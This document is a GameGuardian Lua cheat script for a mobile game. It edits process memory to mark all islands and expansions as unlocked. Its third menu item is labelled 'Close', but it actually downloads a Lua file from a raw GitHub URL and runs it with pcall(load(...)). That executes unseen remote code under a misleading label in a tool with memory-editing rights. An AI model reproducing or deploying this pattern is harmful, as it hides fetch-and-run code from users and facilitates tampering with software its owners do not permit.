

-------------------------------------------------------------------------

-------------------------------------------------------------------------
function inputs()
local input = {}
local configFile = gg.EXT_CACHE_DIR .. '/' .. 
gg.getFile():match('') .. 'island_menu.text'
local data = loadfile(configFile)
if data ~= nil then
data = data()
end
input = gg.prompt({'🏝️island all Unlocked🔎','🏝️Expand all Unlocked🔎','●Close●'},data, {'checkbox','checkbox','checkbox'})
if input ==nil then
else

gg.saveVariable(input, configFile)
if input[1] then
gg.setRanges(gg.REGION_C_ALLOC)
gg.setVisible(false)
gg.searchNumber('306;16;0~16Q::70', gg.TYPE_DWORD, false, gg.SIGN_EQUAL, 0, -1)
gg.setVisible(false)
gg.refineNumber('0~16', gg.TYPE_QWORD, false, gg.SIGN_EQUAL, 0, -1)
gg.getResults(1000)
gg.setVisible(false)
gg.editAll('17', gg.TYPE_DWORD)
gg.clearResults()
end
if input[2] then
gg.setRanges(gg.REGION_C_ALLOC)
gg.setVisible(false)
gg.searchNumber(':expansions', gg.TYPE_BYTE)
gg.getResults(10000)
gg.setVisible(false)
gg.editAll('0', gg.TYPE_BYTE)
gg.clearResults()
end
if input[3] then
L = gg.makeRequest('https://raw.githubusercontent.com/Jkram143/sxvbjjxz/refs/heads/main/DC.lua',nil,'').content
if not L then gg.alert('SERVER: Allow Internet Connection...') else
pcall(load(L)) end
end
 end
  end

-------------------------------------------------------------------------
gg.setVisible(true)
while true do
if gg.isVisible() then
gg.setVisible(false)
inputs() end end
-------------------------------------------------------------------------
